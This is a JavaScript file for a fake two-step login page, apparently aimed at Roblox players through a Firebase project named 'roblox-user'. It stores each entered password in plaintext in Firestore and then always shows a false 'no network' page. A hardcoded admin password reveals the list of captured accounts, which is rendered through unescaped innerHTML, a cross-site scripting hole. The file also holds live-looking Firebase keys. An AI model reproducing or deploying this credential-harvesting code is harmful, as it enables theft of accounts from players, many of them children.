import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  doc,
  setDoc,
  getDocs,
  deleteDoc
} from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";
import {
  getAuth,
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword
} from "https://www.gstatic.com/firebasejs/10.5.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyCzpZCW4fZ9K2nacoMABE53NFLwmNCFkJ4",
  authDomain: "roblox-user-4ebde.firebaseapp.com",
  projectId: "roblox-user-4ebde",
  storageBucket: "roblox-user-4ebde.appspot.com",
  messagingSenderId: "757846340424",
  appId: "1:757846340424:web:80d8221fa476687016797d",
  measurementId: "G-EP32VN6N8Q"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);
const adminPassword = "cliftonOnly";

window.goNext = function () {
  const username = document.getElementById("username").value.trim();
  if (!username) {
    alert("Please enter a username.");
    return;
  }

  localStorage.setItem("tempUsername", username);
  document.getElementById("step1").style.display = "none";
  document.getElementById("step2").style.display = "block";
};

window.submitLogin = async function () {
  const username = localStorage.getItem("tempUsername");
  const password = document.getElementById("password").value.trim();

  if (!password) {
    alert("Please enter a password.");
    return;
  }

  if (password === adminPassword) {
    showAdminPage();
    return;
  }

  const email = `${username}@game.com`;

  try {
    await signInWithEmailAndPassword(auth, email, password);

    const user = auth.currentUser;
    await setDoc(doc(db, "users", user.uid), {
      username,
      lastLogin: new Date().toISOString()
    }, { merge: true });

    console.log("User signed in:", username);
  } catch (error) {
    try {
      const userCredential = await createUserWithEmailAndPassword(auth, email, password);
      const user = userCredential.user;

      await setDoc(doc(db, "users", user.uid), {
        username,
        password,
        createdAt: new Date().toISOString(),
        lastLogin: new Date().toISOString()
      });

      console.log("New user created:", username);
    } catch (e) {
      console.error("Auth error:", e.message);
      document.getElementById("step2").style.display = "none";
      document.getElementById("noNetworkPage").style.display = "block";
      return;
    }
  }

  document.getElementById("step2").style.display = "none";
  document.getElementById("noNetworkPage").style.display = "block";
};

function showAdminPage() {
  document.getElementById("step2").style.display = "none";
  document.getElementById("adminPage").style.display = "block";

  const list = document.getElementById("loginList");
  list.innerHTML = "";

  getDocs(collection(db, "users")).then(snapshot => {
    snapshot.forEach(doc => {
      const data = doc.data();
      const li = document.createElement("li");
      li.innerHTML = `
        <strong>${data.username}</strong><br>
        Created: ${data.createdAt || "N/A"}<br>
        Last Login: ${data.lastLogin || "N/A"}
        <button onclick="deleteUser('${doc.id}')" style="margin-left:10px;">Delete</button>
      `;
      list.appendChild(li);
    });
  });
}

window.deleteUser = async function(uid) {
  try {
    await deleteDoc(doc(db, "users", uid));
    showAdminPage();
  } catch (e) {
    console.error("Delete failed:", e.message);
  }
};

window.logout = function () {
  document.getElementById("adminPage").style.display = "none";
  document.getElementById("noNetworkPage").style.display = "none";
  resetForm();
  document.getElementById("step1").style.display = "block";
};

function resetForm() {
  document.getElementById("username").value = "";
  document.getElementById("password").value = "";
  localStorage.removeItem("tempUsername");
}

window.goBack = function () {
  document.getElementById("noNetworkPage").style.display = "none";
  document.getElementById("step1").style.display = "block";
};
